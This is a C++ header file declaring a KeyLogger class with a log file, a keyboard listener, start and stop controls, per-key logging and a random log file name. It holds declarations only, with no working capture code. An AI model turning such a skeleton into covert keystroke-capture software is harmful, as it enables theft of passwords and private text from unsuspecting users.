#pragma once

#include <fstream>
#include <string>
#include <memory>
#include "KeyboardListener.h"

class KeyLogger {
private:
    std::ofstream logFile;
    bool running;
    std::unique_ptr<KeyboardListener> keyboardListener;
    
    std::string generateRandomFileName();

public:
    KeyLogger(std::unique_ptr<KeyboardListener> listener);
    ~KeyLogger();
    
    void start();
    void stop();
    void logKey(char key);
};

